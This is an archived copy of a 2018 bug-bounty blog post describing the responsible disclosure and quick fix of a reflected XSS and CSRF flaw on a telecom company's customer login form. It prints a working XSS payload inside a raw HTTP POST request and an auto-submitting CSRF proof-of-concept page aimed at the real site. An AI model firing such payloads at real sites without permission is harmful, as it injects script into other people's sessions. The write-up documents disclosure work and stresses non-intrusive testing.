---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-05-19_fastest-fix-on-open-bug-bounty-platform.md
original_filename: 2018-05-19_fastest-fix-on-open-bug-bounty-platform.md
title: Fastest Fix on Open Bug Bounty Platform
category: documents
detected_topics:
- csrf
- xss
- sqli
- command-injection
- path-traversal
- otp
tags:
- imported
- documents
- csrf
- xss
- sqli
- command-injection
- path-traversal
- otp
language: en
raw_sha256: 262932f39c2fe059f1674b04888e1256344bc33b3b2c8b989a5a3bfeed25888c
text_sha256: e1d2ef05251ca27de818dbb9fa90a31f2a7238e1377d68da786c300e691b322d
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: true
---

# Fastest Fix on Open Bug Bounty Platform

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-05-19_fastest-fix-on-open-bug-bounty-platform.md
- Source Type: markdown
- Detected Topics: csrf, xss, sqli, command-injection, path-traversal, otp
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: True
- Raw SHA256: `262932f39c2fe059f1674b04888e1256344bc33b3b2c8b989a5a3bfeed25888c`
- Text SHA256: `e1d2ef05251ca27de818dbb9fa90a31f2a7238e1377d68da786c300e691b322d`


## Content

---
title: "Fastest Fix on Open Bug Bounty Platform"
url: "https://medium.com/@kongwenbin/fastest-fix-on-open-bug-bounty-platform-4bb03ff846e8"
authors: ["Wen Bin KONG (@kongwenbin)"]
programs: ["Kevag Telekom GmbH"]
bugs: ["XSS", "CSRF"]
publication_date: "2018-05-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5876
scraped_via: "browseros"
---

# Fastest Fix on Open Bug Bounty Platform

Fastest Fix on Open Bug Bounty Platform
Wen Bin KONG
Follow
5 min read
·
May 19, 2018

100

I don’t usually write articles related to the bugs that I have reported to organisations through responsible disclosure, however, I have gotten explicit permission from Kevag Telekom GmbH to write a blog post about this report.

Fastest Fix Achievement Badge

By “Fastest Fix” on Open Bug Bounty, I mean my personal achievement in completing all the following steps within 24 hours:

Reporting a bug through the Open Bug Bounty platform (link)
Contacting the affected organisation (via Twitter, Email, Contact form, etc.)
Providing a Proof of Concept (POC) to demonstrate the vulnerability
Getting the organisation to fix the vulnerability and deploy it to the production environment
Conducting a regression test to verify that the vulnerability has been fixed
Triggering Open Bug Bounty platform to verify the fix and update its tracking status

After successfully completing the above steps within 24 hours, the following simple badge has been earned:

Press enter or click to view image in full size
In the name of gamification, Open Bug Bounty provides Security Researchers with Awards and Achievements — which are simple badges that could be earned through fulfilling certain criteria
Open Bug Bounty Platform

A short introduction of the Open Bug Bounty platform for folks who are unfamiliar with it:

Open Bug Bounty is a platform that performs independent verification of the submitted vulnerabilities to confirm the existence of vulnerability as a third party, and also to provide proper notifications to website owners by all available means, such as sending to a list of common email addresses, such as webmaster[at]example[dot]com or security[at]example[dot]com.

Press enter or click to view image in full size
The list of email addresses which will receive a notification for a valid report.
Non-intrusive Testing Only

As the nature of this platform, security researchers are not explicitly given any permissions to perform any forms of testing on these organisations’ web assets. As such, the platform has been constantly reminding the researchers that they should only use non-intrusive testing techniques.

In terms of bugs category, only non-intrusive vulnerabilities such as Cross-Site Scripting (XSS), Open Redirect and a few others are accepted on this platform. Intrusive vulnerabilities like SQL Injection are not accepted.

It is extremely important to remember to not run any vulnerability scanner or automated testing on websites without permissions.

Press enter or click to view image in full size
Constant reminders from the administrators at Open Bug Bounty to only use non-intrusive testing techniques.
Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) on Login Form

The reported bug was a simple XSS vulnerability which exploited the fact that the Login form would reflect any submitted value back onto the page and also, the fact that there is no anti-CSRF token being implemented.

Press enter or click to view image in full size
A Cross-Site Scripting (XSS) proof of concept (POC) was executed to show an alert box to demonstrate the capability of JavaScript execution.

Fair enough, a login form by itself would usually not require any anti-CSRF token as there will not be any security risk, however, because of this, I was able to craft a CSRF proof of concept (POC) HTML page which would automatically submit a maliciously crafted HTTP POST request on behalf of the user who visits the page.

Get Wen Bin KONG’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

In the request, it was possible for attackers to force the user to perform arbitrary JavaScript code execution by injecting them on the “username” field.

The following is the vulnerable HTTP POST request that was shared with the triage team:

POST / HTTP/1.1
Host: kundencenter.kevag-telekom.de
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://kundencenter.kevag-telekom.de/
Cookie: sessionid=<REDACTED>
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
username=%22%3E%3Csvg%2Fonload%3D%22alert%28document.domain%29%22%3E&password=***REDACTED***

The following is the rendered HTML content. As shown, the user-controlled value within “username” parameter would be directly rendered and inserted within the HTML form. In the provided POC, it was possible for me to “close” the Input element and insert a new SVG element that could execute a JavaScript.

Press enter or click to view image in full size
The actual HTML source code after the maliciously crafted HTTP POST request has been rendered on a Firefox web browser.

The following is a simple POC which I have also shared with the triage team, it is an HTML page that would automatically submit an HTTP POST request when the user visits it.

<html>
<body onload="document.poc.submit()">
history.pushState('', '', '/')
<form action="https://kundencenter.kevag-telekom.de/" method="POST" name=poc>
<input type="hidden" name="username" value="&quot;&gt;&lt;svg/onload=&quot;alert(document.domain)&quot;&gt;" />
<input type="hidden" name="password" value="test" />
<input type="hidden" name="IDoMNJOiN6VTxald" value="CzFKivJzOP5Os6t1" />
</form>
</body>
</html>
Why this is awesome?

No, the XSS vulnerability is not awesome.

The speed and accuracy which Kevag Telekom GmbH responded to my report and triaged the vulnerability (scroll up and read step 1 to 6 again) — THAT was awesome!

I have worked with over 50 organisations with and without Hall of Fame listings and worked with their triage team to fix security vulnerabilities before, only a handful has responded with such speed and accuracy. By accuracy, I mean those that fix the issues effectively.

The more amazing thing is that the person who worked with me to fix the issues on Kevag Telekom GmbH told me that he has never heard of the Open Bug Bounty platform before our conversation. At the end of the day, he also provided feedback to me that he found that Open Bug Bounty is a great platform. He liked my report and the overall working experience was great.

Can you imagine someone who does not know about this platform, get notified by it, reacted quickly and positively when I contacted him about this report, worked with me and resolved the issue effectively, then deployed it after proper internal testing? Large organisations usually have many processes and will not fix issues this quick — FYI, they are a telecommunication company, which means that they are not a small organisation either.

Key things to take note of before participation

If you are keen to participate on this platform, please take note of the following message from the Open Bug Bounty administrator (link):

We encourage website owners to say at least a “thank you” to the researcher or write a brief recommendation in the researcher’s profile. There is, however, absolutely no obligation or duty to express a gratitude in any manner.

So, please do not blackmail website owners, as they are not obligated to provide you with a bounty. Some websites might write you a recommendation, such as the following which I have received from Kevag Telekom GmbH, the 5th Dunstable Scout Group and the University of Otago. The teams that I worked with are really good and responded very quickly too.

Recommendations and acknowledgements that I have received on the Open Bug Bounty platform.

Happy hunting!

Disclaimer — this post is not affiliated with OpenBugBounty, Kevag Telekom GmbH or any possible parties. It is solely based on my personal experiences using the platform and interacting with any of the mentioned organisations.

—

Read more posts from me at my blog: https://kongwenbin.com
